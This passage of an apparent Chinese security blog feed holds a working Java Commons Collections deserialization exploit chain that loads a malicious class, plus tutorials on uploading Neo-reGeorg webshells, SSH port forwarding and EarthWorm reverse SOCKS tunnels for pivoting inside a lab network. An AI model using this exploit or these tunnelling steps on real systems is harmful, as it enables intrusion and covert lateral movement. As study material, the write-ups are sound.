oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Object unserialize(String filename) throws Exception &#123;</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));</span><br><span class="line">        return ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="TrAXFilter-InstantiateTransformer-代替-InvokerTransformer"><a href="#TrAXFilter-InstantiateTransformer-代替-InvokerTransformer" class="headerlink" title="TrAXFilter + InstantiateTransformer 代替 InvokerTransformer"></a>TrAXFilter + InstantiateTransformer 代替 InvokerTransformer</h6><p>利用 TrAXFilter 的构造方法调用 TemplatesImpl 的 newTransformer() 方法，就不需要使用 InvokerTransformer 了。入口类可以从上面两个中选一个。</p><p>为了更加通用，这里选择将 HashMap 作为入口类，payload 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class TrAXFilter_TemplatesImpl &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        // 初始化 TemplatesImpl 对象</span><br><span class="line">        TemplatesImpl templates = new TemplatesImpl();</span><br><span class="line">        // _name 不为空</span><br><span class="line">        setFieldValue(templates, &quot;_name&quot;, &quot;test&quot;);</span><br><span class="line">        // 初始化 InstantiateTransformer 对象，利用它实例化 TrAXFilter 对象</span><br><span class="line">        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;);</span><br><span class="line">        // 这里需要用到恶意类的字节码文件，通过 maven 编译后 target 目录下有字节码文件</span><br><span class="line">        byte[] code = Files.readAllBytes(Paths.get(&quot;C:\\Users\\miaoj\\Documents\\Java安全代码实验\\CC3链\\CC3\\target\\classes\\com\\miaoji\\Eval.class&quot;));</span><br><span class="line">        byte[][] codes = &#123;code&#125;;</span><br><span class="line">        // _bytecodes 不为空</span><br><span class="line">        setFieldValue(templates, &quot;_bytecodes&quot;, codes);</span><br><span class="line"></span><br><span class="line">        // 利用 ChainedTransformer 执行 templates.newTransformer();</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(TrAXFilter.class),</span><br><span class="line">                instantiateTransformer</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        // 新建一个 HashMap ，没什么意义，仅作为参数传入</span><br><span class="line">        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        // 初始化利用链 LazyMap，LazyMap 的 get 方法将会调用 chainedTransformer 的 transform 方法</span><br><span class="line">        // 为了防止序列化时命令执行，这里先传入一个普通的 ConstantTransformer 对象</span><br><span class="line">        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));</span><br><span class="line"></span><br><span class="line">        // 将 TiedMapEntry 的 map 属性赋值为 LazyMap 对象</span><br><span class="line">        // 利用链：TiedMapEntry#hashCode() -&gt; TiedMapEntry#getValue() -&gt; TiedMapEntry.map#get()</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;key&quot;);</span><br><span class="line"></span><br><span class="line">        // 新建一个 HashMap 对象，将 TiedMapEntry 对象作为 key 传入，之后将会调用 TiedMapEntry#hashCode()</span><br><span class="line">        HashMap&lt;Object, Object&gt; map2 = new HashMap&lt;&gt;();</span><br><span class="line">        // 序列化时这里将会提前调用 TiedMapEntry#hashCode() ，导致 lazyMap::get()被调用，导致 lazyMap 的 key 属性被赋值</span><br><span class="line">        // 于是反序列化调用 lazyMap::get() 时无法进入判断，无法调用 transform 方法</span><br><span class="line">        map2.put(tiedMapEntry, &quot;test&quot;);</span><br><span class="line">        // 为了解决上述问题，HashMap 对象的 put 方法执行后需要去除 lazyMap 中的 key</span><br><span class="line">        lazyMap.remove(&quot;key&quot;);</span><br><span class="line"></span><br><span class="line">        // 最后利用反射将 LazyMap 的 factory 对象修改为 chainedTransformer</span><br><span class="line">        Class c = LazyMap.class;</span><br><span class="line">        Field factory = c.getDeclaredField(&quot;factory&quot;);</span><br><span class="line">        factory.setAccessible(true);</span><br><span class="line">        factory.set(lazyMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        serialize(map2);</span><br><span class="line">        unserialize(&quot;trAXFilter_templatesImpl.bin&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void setFieldValue(Object object, String field_name, Object filed_value) throws Exception &#123;</span><br><span class="line">        Class clazz = object.getClass();</span><br><span class="line">        Field declaredField = clazz.getDeclaredField(field_name);</span><br><span class="line">        declaredField.setAccessible(true);</span><br><span class="line">        declaredField.set(object, filed_value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void serialize(Object obj) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;trAXFilter_templatesImpl.bin&quot;));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Object unserialize(String filename) throws Exception &#123;</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));</span><br><span class="line">        return ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;CC3 链的核心在于利用 TemplatesImpl 加载恶意类时执行静态代码块。&lt;/p&gt;</summary>
    
    
    
    <category term="Java 安全" scheme="https://changeyourway.github.io/categories/Java-%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>内网渗透 03 - 隧道通信</title>
    <link href="https://changeyourway.github.io/2024/05/16/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F03-%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1/"/>
    <id>https://changeyourway.github.io/2024/05/16/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F03-%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1/</id>
    <published>2024-05-16T07:07:30.219Z</published>
    <updated>2024-05-16T07:18:32.148Z</updated>
    
    <content type="html"><![CDATA[<p>网络隧道技术指的是利用一种网络协议来传输另一种网络协议，它主要利用网络隧道协议来实现这种功能。网络隧道技术涉及了三种网络协议，即网络隧道协议、隧道协议下面的承载协议和隧道协议所承载的被承载协议。</p><span id="more"></span><h2 id="内网渗透-隧道通信"><a href="#内网渗透-隧道通信" class="headerlink" title="内网渗透-隧道通信"></a>内网渗透-隧道通信</h2><p>推荐博客：<a href="https://zhuanlan.zhihu.com/p/442344972">内网渗透之隧道传输技术</a> </p><h3 id="什么是隧道协议？"><a href="#什么是隧道协议？" class="headerlink" title="什么是隧道协议？"></a>什么是隧道协议？</h3><p><strong>隧道协议</strong>（英语：Tunneling Protocol）是一种网络协议，在其中，使用一种网络协议（发送协议），将另一个不同的网络协议，封装在负载部分。使用隧道的原因是在不兼容的网络上传输数据，或在不安全网络上提供一个安全路径。</p><p>常见的隧道协议包括 SSH，TLS，SOCKS，PPTP 等。</p><h3 id="什么是隧道传输？"><a href="#什么是隧道传输？" class="headerlink" title="什么是隧道传输？"></a>什么是隧道传输？</h3><p>网络隧道技术指的是利用一种网络协议来传输另一种网络协议，它主要利用网络隧道协议来实现这种功能。网络隧道技术涉及了三种网络协议，即网络隧道协议、隧道协议下面的承载协议和隧道协议所承载的被承载协议。</p><p>防火墙两端的数据包通过防火墙所允许的数据包类型或端口进行封装，然后穿过防火墙，与对方进行通信。当被封装的数据包到达目的地时，将数据包还原，并将还原后的数据包发送到相应的服务器上。常见的隧道列举如下：</p><ul><li>网络层：IPv6 隧道、ICMP 隧道、GRE 隧道</li><li>传输层：TCP 隧道、UDP 隧道、常规端口转发</li><li>应用层：SSH 隧道、HTTP 隧道、HTTPS 隧道、DNS 隧道</li></ul><h3 id="Metasploit-攻击载荷的分类"><a href="#Metasploit-攻击载荷的分类" class="headerlink" title="Metasploit 攻击载荷的分类"></a>Metasploit 攻击载荷的分类</h3><p>攻击载荷（payload）可分为 single、stager、stage 三种。</p><p>1、 <strong>singles（独立载荷）</strong> </p><p>直接植入目标系统并执行相应的程序，如：<code>shell_bind_tcp</code>，<code>meterpreter_reverse_tcp</code></p><p>2、<strong>stagers（传输器载荷）</strong> </p><p>用于目标机与攻击机之间建立稳定的网络连接，与 stages（传输体载荷）配合攻击，该种载荷体积都非常小，如：bind 型和 reverse 型。</p><p>bind 型：需要攻击机主动连接目标端口。</p><p>reverse 型：目标机反向连接攻击机，需要提前设定好连接攻击机的 ip 地址和端口号。</p><p>3、<strong>stages（传输体）</strong> </p><p>在 stagers 建立好稳定的连接后，攻击机将 stages 传输给目标机，由 stagers 进行相应处理，将控制权转交给 stages 。如得到目标机的 shell 或者 meterpreter 控制程序运行。这样攻击机可以在本端输入相应命令控制目标机。</p><p>stager 和 stage 就像 web 入侵里面提到的小马和大马一样，由于 exploit 环境的限制，可能不能一下子把 stage 传过去，需要先传一个 stager ，stager 在 attacker 和 target 之间建立网络连接，之后再把 stage 传过去进行下一步的行动。</p><p><strong>格式</strong></p><p>single payload 的格式为：<target>&#x2F;<single> ，比如：<code>windows/shell_bind_tcp</code> ；</p><p>stages&#x2F;stagers payload 的格式为：<target>&#x2F;<stage>&#x2F;<stager> ，比如：<code>windows/meterpreter/bind_tcp</code></p><h3 id="使用-Neo-reGeorg-建立正向隧道"><a href="#使用-Neo-reGeorg-建立正向隧道" class="headerlink" title="使用 Neo-reGeorg 建立正向隧道"></a>使用 Neo-reGeorg 建立正向隧道</h3><h4 id="关于-Neo-reGeorg"><a href="#关于-Neo-reGeorg" class="headerlink" title="关于 Neo-reGeorg"></a>关于 Neo-reGeorg</h4><p>Neo-reGeorg 是常见的 http 正向隧道工具，是 reGeorg 工具的升级版。增加了很多特性，例如像内容加密、避免被检测、请求头定制、响应码定制、支持 py3 等等。</p><p>有时候我们会发现上传的木马很快就被杀掉了，导致无法获取 shell ，但是目标主机又开启了 web 服务，那么这时就可以建立 http 隧道。</p><p>下载地址：<a href="https://github.com/L-codes/Neo-reGeorg">https://github.com/L-codes/Neo-reGeorg</a></p><h4 id="Neo-reGeorg-使用方法"><a href="#Neo-reGeorg-使用方法" class="headerlink" title="Neo-reGeorg 使用方法"></a>Neo-reGeorg 使用方法</h4><p>进入到 Neo-reGeorg-master 目录下，执行以下命令，生成 webshell ，连接密码为 ‘ shell ’ ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 neoreg.py generate -k shell</span><br></pre></td></tr></table></figure><p>这会在当前目录下生成一个 neoreg_servers 文件夹，里面包含了各种类型的 webshell ：</p><img src="/images/image-20240414130340757.png"><p>在生成的 webshell 中选择目标机对应语言的后门上传即可。</p><p>上传成功后，通过以下命令建立起隧道通信：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 neoreg.py -k shell -u http://192.168.43.13:8080/tunnel.php</span><br></pre></td></tr></table></figure><p>执行结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Neo-reGeorg-master]</span><br><span class="line">└─# python3 neoreg.py -k shell -u http://192.168.43.13:8080/tunnel.php</span><br><span class="line"></span><br><span class="line">​      &quot;$$$$$$&#x27;&#x27;  &#x27;M$  &#x27;$$$@m</span><br><span class="line">​    :$$$$$$$$$$$$$$&#x27;&#x27;$$$$&#x27;</span><br><span class="line">   &#x27;$&#x27;    &#x27;JZI&#x27;$$&amp;  $$$$&#x27;</span><br><span class="line">​             &#x27;$$$  &#x27;$$$$</span><br><span class="line">​             $$$$  J$$$$&#x27;</span><br><span class="line">​            m$$$$  $$$$,</span><br><span class="line">​            $$$$@  &#x27;$$$$_          Neo-reGeorg</span><br><span class="line">​         &#x27;1t$$$$&#x27; &#x27;$$$$&lt;</span><br><span class="line">​      &#x27;$$$$$$$$$$&#x27;  $$$$          version 5.2.0</span><br><span class="line">​           &#x27;@$$$$&#x27;  $$$$&#x27;</span><br><span class="line">​            &#x27;$$$$  &#x27;$$$@</span><br><span class="line">​         &#x27;z$$$$$$  @$$$</span><br><span class="line">​            r$$$   $$|</span><br><span class="line">​            &#x27;$$v c$$</span><br><span class="line">​           &#x27;$$v $$v$$$$$$$$$#</span><br><span class="line">​           $$x$$$$$$$$$twelve$$$@$&#x27;</span><br><span class="line">​         @$$$@L &#x27;    &#x27;&lt;@$$$$$$$$`</span><br><span class="line">​       $$                 &#x27;$$$</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    [ Github ] https://github.com/L-codes/Neo-reGeorg</span><br><span class="line"></span><br><span class="line">+------------------------------------------------------------------------+</span><br><span class="line">  Log Level set to [ERROR]</span><br><span class="line">  Starting SOCKS5 server [127.0.0.1:1080]</span><br><span class="line">  Tunnel at:</span><br><span class="line">    http://192.168.43.13:8080/tunnel.php</span><br><span class="line">+------------------------------------------------------------------------+</span><br></pre></td></tr></table></figure><p>默认建立的是 socks5:&#x2F;&#x2F;127.0.0.1:1080 ，所以依然可以通过 proxychains 来利用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains curl http://192.168.43.13:8080</span><br></pre></td></tr></table></figure><h3 id="基于-SSH-的隧道通信"><a href="#基于-SSH-的隧道通信" class="headerlink" title="基于 SSH 的隧道通信"></a>基于 SSH 的隧道通信</h3><h4 id="什么是-ssh-隧道"><a href="#什么是-ssh-隧道" class="headerlink" title="什么是 ssh 隧道"></a>什么是 ssh 隧道</h4><p>SSH 隧道即 SSH 端口转发，在 SSH 客户端与 SSH 服务端之间建立一个隧道，将网络数据通过该隧道转发至指定端口，从而进行网络通信。SSH 隧道自动提供了相应的加密及解密服务，保证了数据传输的安全性。</p><h4 id="Windows-server-2019-开启-ssh-服务"><a href="#Windows-server-2019-开启-ssh-服务" class="headerlink" title="Windows server 2019 开启 ssh 服务"></a>Windows server 2019 开启 ssh 服务</h4><p>首先需要开启靶机的 22 端口，使其能够进行 ssh 远程连接。</p><p>下方搜索栏搜索并打开 “ 应用和功能 ” ：</p><img src="/images/image-20240414170613793.png"><p>选择 “ 管理可选功能 ” ：</p><img src="/images/image-20240414170703820.png"><p>选择 “ 添加功能 ” ：</p><img src="/images/image-20240414170739950.png"><p>选择 “ OpenSSH 服务器 ” 并安装。</p><p>安装后程序位于：C:\Windows\System32\OpenSSH 。</p><p>执行以下命令即可开启 sshd 服务：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net start sshd</span><br></pre></td></tr></table></figure><img src="/images/image-20240414171623552.png"><h4 id="ssh-本地端口转发"><a href="#ssh-本地端口转发" class="headerlink" title="ssh 本地端口转发"></a>ssh 本地端口转发</h4><p>ssh 本地端口转发命令的「-L」旗标后可以填写四个参数，完整格式为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L [收听接口:]收听端口:目标主机:目标端口 username@hostname</span><br></pre></td></tr></table></figure><p>命令中方括号内的部分，即第一个参数可以不写；它的默认值一般是 0.0.0.0（OpenSSH 客户端配置文件「ssh_config」中「GatewayPorts」选项的值一般为「yes」），意味着 SSH 隧道会收听所有接口，接受来自任何地址的应用访问请求并进行转发。</p><p>执行此命令后，将能够在收听端口处访问目标主机的目标端口。</p><p>比如，以 192.168.43.13 为跳板机，将 192.168.52.143 内网主机的 80 端口转发到本机的 8879 端口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -L 8879:192.168.52.143:80 Administrator@192.168.43.13</span><br></pre></td></tr></table></figure><ol><li><code>-C</code>：这个选项表示启用压缩。SSH 将会压缩数据包数据，这可以提高传输效率，特别是在带宽较低的情况下。压缩可以减少传输的数据量，从而加快数据传输速度，并可能降低网络延迟。</li><li><code>-f</code>：这个选项表示 SSH 客户端在创建隧道后进入后台运行。这意味着一旦隧道建立，SSH 客户端不会占用终端，允许用户继续在同一个终端上执行其他任务。这对于需要长时间运行的隧道特别有用。</li><li><code>-N</code>：这个选项表示如果 SSH 检测到隧道没有数据传输，它不会关闭隧道。通常，SSH 会关闭空闲的隧道以节省资源，但使用 <code>-N</code> 选项后，即使没有数据流动，隧道也会保持开启状态。</li><li><code>-g</code>：这个选项允许 SSH 绑定到非本地地址。默认情况下，SSH 只能绑定到本地地址，但使用 <code>-g</code> 选项后，可以指定一个非本地的端口进行监听。这对于需要从远程网络访问本地服务的情况非常有用。</li></ol><p>那么此时访问本机的 8879 端口就可以访问到内网主机 192.168.52.143 的 80 端口了。</p><p>上述命令在 kali 上执行，因此称为本地转发。</p><h4 id="kali-开启-sshd-服务"><a href="#kali-开启-sshd-服务" class="headerlink" title="kali 开启 sshd 服务"></a>kali 开启 sshd 服务</h4><p><strong>一、配置 SSH 参数</strong></p><p>修改 sshd_config 文件，命令为：<code>vi /etc/ssh/sshd_config</code> 。</p><p>将 #PasswordAuthentication no 的注释去掉，并且将 NO 修改为 YES &#x2F;&#x2F; kali 中默认是 yes ；</p><p>将 #PermitRootLogin without-password 修改为 PermitRootLogin yes ；</p><p>然后保存退出 vi 编辑器。</p><p><strong>二、启动 SSH 服务</strong> </p><p>启动 SSH 服务，命令为： <code>/etc/init.d/ssh start</code> </p><p>或者： <code>service ssh start</code> </p><p>查看 SSH 服务状态是否正常运行，命令为： <code>/etc/init.d/ssh status</code> </p><p>或者： <code>service ssh status</code> </p><p>注明：这两种启动 ssh 方式都是临时性的，如果机器重启就需要重新输入上面命令才可以开启 ssh ，如果需要 ssh 服务下次开机自动启动，则需要使用以下命令启动 ssh 服务，命令为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">update-rc.d ssh enable // 系统自动启动SSH服务</span><br><span class="line">update-rc.d ssh disabled // 关闭系统自动启动SSH服务</span><br></pre></td></tr></table></figure><p><strong>三、关闭 ssh 服务</strong> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service sshd stop</span><br></pre></td></tr></table></figure><h4 id="SSH-远程端口转发"><a href="#SSH-远程端口转发" class="headerlink" title="SSH 远程端口转发"></a>SSH 远程端口转发</h4><p>在 Windows server 2019 上执行以下命令用 ssh 连接 kali ，这里的 192.168.52.143 仍然是内网主机，但最后是 kali 的用户名和 IP ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -R 3333:192.168.52.143:80 root@192.168.43.173</span><br></pre></td></tr></table></figure><p>这样做的前提是 kali 要启动 sshd 服务。完成上述操作后，在 kali 上访问 127.0.0.1:3333 即可访问到 192.168.52.143:80 。</p><h3 id="EarthWorm-工具的使用"><a href="#EarthWorm-工具的使用" class="headerlink" title="EarthWorm 工具的使用"></a>EarthWorm 工具的使用</h3><p>EW（Earthworm）是一套便携式的网络穿透工具，具有 SOCKS v5 服务架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透。该工具能够以 “正向” 、“反向” 、“多级级联” 等方式打通一条网络隧道，直达网络深处，用蚯蚓独有的手段突破网络限制，给防火墙松土。工具包中提供了多种可执行文件，以适用不同的操作系统，Linux、Windows、MacOS、Arm-Linux 均被包括其内，强烈推荐使用。</p><p>下载地址：<a href="https://github.com/mrawb/ew/tree/master">https://github.com/mrawb/ew/tree/master</a></p><p><strong>EW 的使用方法</strong> </p><p>该工具共有 6 种命令格式（ <code>ssocksd</code> 、<code>rcsocks</code> 、<code>rssocks</code> 、<code>lcx_slave</code> 、<code>lcx_listen</code> 、<code>lcx_tran</code> ）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">./ew -s ssocksd -l 1080       //开启正向socks服务</span><br><span class="line"></span><br><span class="line">./ew -s rcsocks -l 1080 -e 8888  //监听1080端口，1080接收的数据通过8888交互传递</span><br><span class="line"></span><br><span class="line">./ew -s rssocks -d rev_ip -e 8888 //开启反向socks服务。反向连接rev_ip的8888端口</span><br><span class="line"></span><br><span class="line">./ew -s lcx_listen -l 1080 -e 8888  //监听1080端口，1080接收的数据通过8888交互传递</span><br><span class="line"></span><br><span class="line">./ew -s lcx_tran -l 1080 -f forward_ip -g8888 //监听1080端口，1080接收的数据正向传给forward_ip的8888端口</span><br><span class="line"></span><br><span class="line">./ew -s lcx_slave -d vps_ip -e 8888 -f B_ip-g 9999 //作为中间角色，反向连接vps的8888，正向连接B的9999。打通两者</span><br></pre></td></tr></table></figure><p>注意，这里的 .&#x2F;ew 是指 ew-master 目录下的任意一个可执行文件，根据对应的操作系统选择一个。</p><h4 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h4><p>在 Windows Server 2019 上运行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew_for_Win.exe -s ssocksd -l 1080</span><br></pre></td></tr></table></figure><p>此时将 kali 的代理设置为 <code>Windows Server 2019 的 IP + 端口 1080</code> 即可访问内网中的其他机器。</p><h4 id="反弹代理"><a href="#反弹代理" class="headerlink" title="反弹代理"></a>反弹代理</h4><p>原理就是让 Windows Server 2019 主动去连接一台公网服务器，然后攻击者把这台公网服务器当代理，就可以访问内网了。</p><p>当然也可以直接让 Windows Server 2019 主动去连接 kali 攻击机，但是使用上一种方法可以隐藏 kali IP。</p><p>在一台 Ubuntu 公网服务器上执行监听：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew_for_linux64 -s rcsocks -l 8080 -e 8888</span><br></pre></td></tr></table></figure><p>那么此时这台公网服务器就会监听 8080 端口，并将 8080 端口接收的数据通过 8888 端口交互传递。简单点说，就是 kali 在设置代理的时候要设置 <code>公网服务器 IP + 8080 端口</code> ，而 Windows Server 2019 则需要主动去连接这台公网服务器的 8888 端口。</p><p>如果没有执行权限的话需要赋予执行权限：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x ew_for_linux64</span><br></pre></td></tr></table></figure><p>在 Windows Server 2019 上执行以下命令与公网服务器建立连接：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew_for_Win.exe -s rssocks -d 公网服务器IP -e 8888</span><br></pre></td></tr></table></figure><p>此时在 kali 上配置代理为 <code>公网服务器 IP + 8080 端口</code> 即可访问内网。</p><p>不过因为不明原因，本次实验失败，报错：代理服务器拒绝连接。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;网络隧道技术指的是利用一种网络协议来传输另一种网络协议，它主要利用网络隧道协议来实现这种功能。网络隧道技术涉及了三种网络协议，即网络隧道协议、隧道协议下面的承载协议和隧道协议所承载的被承载协议。&lt;/p&gt;</summary>
    
    
    
    <category term="内网渗透" scheme="https://changeyourway.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>内网渗透 02 - 端口扫描</title>
    <link href="https://changeyourway.github.io/2024/05/16/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F02-%E5%86%85%E7%BD%91%E6%89%AB%E6%8F%8F/"/>
    <id>https://changeyourway.github.io/2024/05/16/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F02-%E5%86%85%E7%BD%91%E6%89%AB%E6%8F%8F/</id>
    <published>2024-05-16T03:27:02.888Z</published>
    <updated>2024-05-16T07:16:46.071Z</updated>
    
    <content type="html"><![CDATA[<p>收集内网 IP ，进行端口扫描。</p><span id="more"></span><h2 id="内网渗透-端口扫描"><a href="#内网渗透-端口扫描" class="headerlink" title="内网渗透-端口扫描"></a>内网渗透-端口扫描</h2><p>可以说内网渗透测试，其本质就是信息收集。信息收集的深度，直接关系到内网渗透测试的成败。当你拿下内网的一台主机后，面对的是一片未知的区域，所以首先要做的就是对当前所处的网络环境进行判断。包括以下几点：</p><ul><li>对当前机器角色的判断</li><li>对当前机器所处的网络环境进行判断</li><li>对当前机器所处的网络区域进行判断</li></ul><h3 id="通过-ARP-缓存发现内网存活主机"><a href="#通过-ARP-缓存发现内网存活主机" class="headerlink" title="通过 ARP 缓存发现内网存活主机"></a>通过 ARP 缓存发现内网存活主机</h3><p>ARP 全称为 Address Resolution Protocol ，即地址解析协议，它是一个根据 IP 地址获取物理地址的 TCP&#x2F;IP 协议，主机发送信息时将包含目标 IP 地址的 ARP 请求广播到网络上的所有主机，并接收返回消息，以此确定目标的物理地址，收到返回消息后将该 IP 地址和物理地址存入本机 ARP 缓存中并保留一定时间，下次请求时直接查询 ARP 缓存以节约资源。</p><p>因此，可以通过查看 arp 缓存来发现内网主机：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp -a</span><br></pre></td></tr></table></figure><p>发现 52 网段的其他存活主机，如 192.168.52.138，192.168.52.143 ：</p><img src="/images/image-20240407105233431.png"><p>至于这里的 